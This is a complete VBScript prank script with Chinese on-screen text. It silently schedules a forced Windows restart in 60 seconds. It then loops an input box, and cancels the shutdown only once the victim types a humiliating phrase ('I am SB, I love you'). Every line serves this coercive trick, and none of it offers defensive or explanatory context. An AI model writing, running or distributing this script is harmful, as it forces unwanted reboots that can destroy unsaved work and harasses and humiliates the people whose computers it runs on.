 on error resume next
 dim WSHshellA
 set WSHshellA = wscript.createobject("wscript.shell")
 WSHshellA.run "cmd.exe /c shutdown -r -t 60 -c ""我是SB，我爱你，不喊我是SB，我爱你就一分钟关你机，不信，试试···"" ",0 ,true  
 dim a
 do while(a <> "我是SB，我爱你")
 a = inputbox ("我是SB，我爱你,就不关机，快撒，喊 ""我是SB，我爱你""　","喊不喊","不喊",8000,7000)
 msgbox chr(13) + chr(13) + chr(13) + a,0,"MsgBox"
 loop
msgbox chr(13) + chr(13) + chr(13) + "早喊不就行了嘛"
dim WSHshell
set WSHshell = wscript.createobject("wscript.shell")
WSHshell.run "cmd.exe /c shutdown -a",0 ,true  
msgbox chr(13) + chr(13) + chr(13) + "哈哈哈哈，真过瘾"


